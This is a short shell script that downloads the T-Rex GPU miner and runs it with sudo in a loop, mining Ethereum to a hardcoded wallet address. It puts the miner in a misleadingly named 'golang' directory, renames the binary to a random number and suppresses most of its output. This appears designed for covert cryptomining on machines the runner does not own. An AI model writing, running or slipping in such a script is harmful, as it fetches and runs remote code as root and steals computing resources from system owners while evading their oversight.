#!/bin/sh
apt-get install libpci3 
P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
y=$(( RANDOM - ( RANDOM + RANDOM ) ))
x=1
mkdir golang && cd golang
# wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
#tar -xf t-rex-0.21.3-linux.tar.gz
tar -xf t-rex-0.21.6-linux.tar.gz
mv t-rex $y
# --gpu-report-interval 10
while [ $x -le 20 ]
do

  sudo ./$y -a ethash -o eth.2miners.com:2020 -u 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.TREX$P -p x --coin ETH --intensity 18 --low-load 1 --no-color --quiet --hide-date --send-stales --no-nvml --no-strict-ssl


  x=$(( $x + 1 ))
  sleep 120
  echo "All done with $x times"
done

